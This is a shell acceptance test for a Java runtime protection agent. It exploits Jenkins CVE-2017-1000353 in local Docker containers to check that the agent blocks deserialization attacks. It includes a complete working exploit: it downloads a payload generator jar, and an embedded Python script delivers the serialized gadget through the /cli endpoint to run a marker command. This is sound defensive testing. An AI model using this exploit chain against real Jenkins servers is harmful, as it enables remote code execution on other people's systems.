#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_JENKINS_1000353_IMAGE:-vulhub/jenkins:2.46.1}"
baseline_name="${OHMYRASP_VULHUB_JENKINS_1000353_BASELINE_NAME:-ohmyrasp-vulhub-jenkins-1000353-baseline}"
protected_name="${OHMYRASP_VULHUB_JENKINS_1000353_PROTECTED_NAME:-ohmyrasp-vulhub-jenkins-1000353-protected}"
baseline_port="${OHMYRASP_VULHUB_JENKINS_1000353_BASELINE_PORT:-19144}"
protected_port="${OHMYRASP_VULHUB_JENKINS_1000353_PROTECTED_PORT:-19145}"
marker="${OHMYRASP_VULHUB_JENKINS_1000353_MARKER:-/tmp/ohmyrasp-jenkins-1000353-success}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
payload_tool_url="${OHMYRASP_JENKINS_1000353_TOOL_URL:-https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar}"
payload_tool_dir="${OHMYRASP_JENKINS_1000353_TOOL_DIR:-/tmp/ohmyrasp-jenkins-1000353}"
openjdk8u292_image="${OHMYRASP_OPENJDK_8U292_IMAGE:-openjdk:8u292}"
baseline_dir="logs/vulhub-jenkins-2017-1000353-java8-baseline"
protected_dir="logs/vulhub-jenkins-2017-1000353-java8-protected"
payload_dir="logs/vulhub-jenkins-2017-1000353-java8-payload"
protected_log="${protected_dir}/events.jsonl"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 15 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_jenkins() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 300); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "http://127.0.0.1:${port}/")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "403" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "Jenkins CVE-2017-1000353 container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Jenkins CVE-2017-1000353 did not become ready at ${port}" >&2
  exit 1
}

prepare_payload_tool() {
  mkdir -p "$payload_tool_dir"
  if [[ ! -s "${payload_tool_dir}/CVE-2017-1000353-1.1-SNAPSHOT-all.jar" ]]; then
    curl -fsSL "$payload_tool_url" \
      -o "${payload_tool_dir}/CVE-2017-1000353-1.1-SNAPSHOT-all.jar"
  fi
}

verify_image_java8() {
  docker run --rm --entrypoint sh "$image" \
    -lc 'java -version' > "${payload_dir}/image-java-version.txt" 2>&1 || true
  if ! grep -Fq '1.8.0_' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "Jenkins CVE-2017-1000353 image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

generate_payload() {
  docker run --rm \
    -v "${payload_tool_dir}:/tool:ro" \
    -v "$(pwd)/${payload_dir}:/work" \
    -w /work \
    "$openjdk8u292_image" \
    java -jar /tool/CVE-2017-1000353-1.1-SNAPSHOT-all.jar \
      jenkins-1000353.ser "touch ${marker}"
  test -s "${payload_dir}/jenkins-1000353.ser"
}

send_cli_payload() {
  local port="$1"
  local output="$2"
  python3 - "$port" "${payload_dir}/jenkins-1000353.ser" "$output" <<'PY'
import http.client
import sys
import threading
import time
import uuid

port = int(sys.argv[1])
payload_file = sys.argv[2]
output = sys.argv[3]
session = str(uuid.uuid4())
path = "/cli"
host = "127.0.0.1"
PREAMBLE = b"<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4="
PROTO = b"\x00\x00\x00\x00"
with open(payload_file, "rb") as handle:
    FILE_SER = handle.read()

records = []


def send_chunk(conn, data):
    conn.send(("%x\r\n" % len(data)).encode("ascii"))
    conn.send(data)
    conn.send(b"\r\n")


def finish_chunks(conn):
    conn.send(b"0\r\n\r\n")


def download_side():
    try:
      conn = http.client.HTTPConnection(host, port, timeout=45)
      conn.putrequest("POST", path)
      conn.putheader("Side", "download")
      conn.putheader("Content-Type", "application/x-www-form-urlencoded")
      conn.putheader("Session", session)
      conn.putheader("Transfer-Encoding", "chunked")
      conn.endheaders()
      send_chunk(conn, b" ")
      finish_chunks(conn)
      response = conn.getresponse()
      data = response.read(4096)
      records.append("download_status=%s bytes=%s" % (response.status, len(data)))
      conn.close()
    except Exception as exc:
      records.append("download_error=%s" % exc)


def upload_side():
    try:
      conn = http.client.HTTPConnection(host, port, timeout=45)
      conn.putrequest("POST", path)
      conn.putheader("Side", "upload")
      conn.putheader("Session", session)
      conn.putheader("Content-Type", "application/octet-stream")
      conn.putheader("Accept-Encoding", "")
      conn.putheader("Transfer-Encoding", "chunked")
      conn.putheader("Cache-Control", "no-cache")
      conn.endheaders()
      for chunk in (PREAMBLE, PROTO, FILE_SER):
          send_chunk(conn, chunk)
      finish_chunks(conn)
      response = conn.getresponse()
      data = response.read(4096)
      records.append("upload_status=%s bytes=%s" % (response.status, len(data)))
      conn.close()
    except Exception as exc:
      records.append("upload_error=%s" % exc)


thread = threading.Thread(target=download_side)
thread.start()
time.sleep(2)
upload_side()
thread.join(timeout=45)
with open(output, "w", encoding="utf-8") as handle:
    handle.write("session=%s\n" % session)
    handle.write("\n".join(records))
    handle.write("\n")
PY
}

container_has_marker() {
  local name="$1"
  docker exec "$name" sh -lc "test -f '${marker}'"
}

wait_for_marker() {
  local name="$1"
  local dir="$2"
  for attempt in $(seq 1 60); do
    printf 'marker_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
    if container_has_marker "$name"; then
      return
    fi
    sleep 1
  done
  copy_artifacts "$name" "$dir"
  echo "Jenkins CVE-2017-1000353 baseline did not create ${marker}" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 180); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event for Jenkins CVE-2017-1000353" >&2
  exit 1
}

deserialization_block_count() {
  grep -Ec '"algorithm":"java8_deserialization_gadget_class".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_deserialization_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 60); do
    count="$(deserialization_block_count)"
    if (( count > previous )); then
      printf 'deserialization_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_deserialization_gadget_class block event for Jenkins CVE-2017-1000353" >&2
  exit 1
}

run_baseline() {
  docker run -d --init --name "$baseline_name" \
    -p "${baseline_port}:8080" \
    "$image" >/dev/null

  wait_for_jenkins "$baseline_name" "$baseline_port" "$baseline_dir"
  docker exec "$baseline_name" rm -f "$marker"
  send_cli_payload "$baseline_port" "${baseline_dir}/cli-exploit.response"
  wait_for_marker "$baseline_name" "$baseline_dir"

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --init --name "$protected_name" \
    -p "${protected_port}:8080" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_jenkins "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "Jenkins CVE-2017-1000353 protected startup produced a detection before exploit traffic" >&2
    exit 1
  fi

  local previous_count
  previous_count="$(deserialization_block_count)"
  docker exec "$protected_name" rm -f "$marker"
  send_cli_payload "$protected_port" "${protected_dir}/cli-exploit.response"
  wait_for_deserialization_block "$previous_count"
  if container_has_marker "$protected_name"; then
    cat "$protected_log" >&2 || true
    echo "Jenkins CVE-2017-1000353 protected marker was created despite block" >&2
    exit 1
  fi
}

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_payload_tool
verify_image_java8
generate_payload
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f -v "$protected_name" >/dev/null 2>&1 || true

echo "vulhub Jenkins 2.46.1 CVE-2017-1000353 Java8 acceptance passed"
